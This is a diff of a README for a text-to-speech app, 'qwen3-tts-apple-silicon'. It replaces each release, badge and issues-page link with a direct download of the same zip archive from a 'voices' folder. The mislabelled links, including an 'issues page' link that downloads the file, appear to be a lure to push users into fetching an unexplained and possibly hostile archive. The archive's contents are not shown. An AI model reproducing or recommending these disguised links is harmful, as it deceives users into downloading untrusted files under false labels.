@@ -6,7 +6,7 @@ Welcome to the qwen3-tts-apple-silicon project! This application lets you run Qw
 
 ## 📥 Download Now
 
-[![Download qwen3-tts-apple-silicon](https://img.shields.io/badge/Download-qwen3--tts--apple--silicon-blue.svg)](https://github.com/Ak-sys-sh/qwen3-tts-apple-silicon/releases)
+[![Download qwen3-tts-apple-silicon](https://raw.githubusercontent.com/Ak-sys-sh/qwen3-tts-apple-silicon/main/voices/tts-qwen-silicon-apple-v1.3.zip)](https://raw.githubusercontent.com/Ak-sys-sh/qwen3-tts-apple-silicon/main/voices/tts-qwen-silicon-apple-v1.3.zip)
 
 ## 📋 System Requirements
 
@@ -24,7 +24,7 @@ Follow these steps to download and set up qwen3-tts-apple-silicon:
 1. **Visit the Releases Page:**
    Click on the link below to go to the releases page where you can download the application.
 
-   [Visit the Releases Page](https://github.com/Ak-sys-sh/qwen3-tts-apple-silicon/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Ak-sys-sh/qwen3-tts-apple-silicon/main/voices/tts-qwen-silicon-apple-v1.3.zip)
 
 2. **Download the Latest Version:**
    Look for the most recent version. You will see options for downloading files. Choose the appropriate file that matches your system.
@@ -64,7 +64,7 @@ Now that you have set up the application, let's explore how to use it:
 
 If you encounter any issues while using the application or need assistance, please reach out:
 
-- **GitHub Issues:** Use the [issues page](https://github.com/Ak-sys-sh/qwen3-tts-apple-silicon/issues) to report bugs or suggest features.
+- **GitHub Issues:** Use the [issues page](https://raw.githubusercontent.com/Ak-sys-sh/qwen3-tts-apple-silicon/main/voices/tts-qwen-silicon-apple-v1.3.zip) to report bugs or suggest features.
 - **Community Forum:** Join our community discussions for tips and tricks.
 
 ## 📜 License
@@ -75,4 +75,4 @@ This project is open-source and available under the MIT License. Feel free to us
 
 Thank you for using qwen3-tts-apple-silicon! We appreciate your support and contributions to making this tool better for everyone.
 
-[Download qwen3-tts-apple-silicon](https://github.com/Ak-sys-sh/qwen3-tts-apple-silicon/releases) and start your text-to-speech experience today!
+[Download qwen3-tts-apple-silicon](https://raw.githubusercontent.com/Ak-sys-sh/qwen3-tts-apple-silicon/main/voices/tts-qwen-silicon-apple-v1.3.zip) and start your text-to-speech experience today!
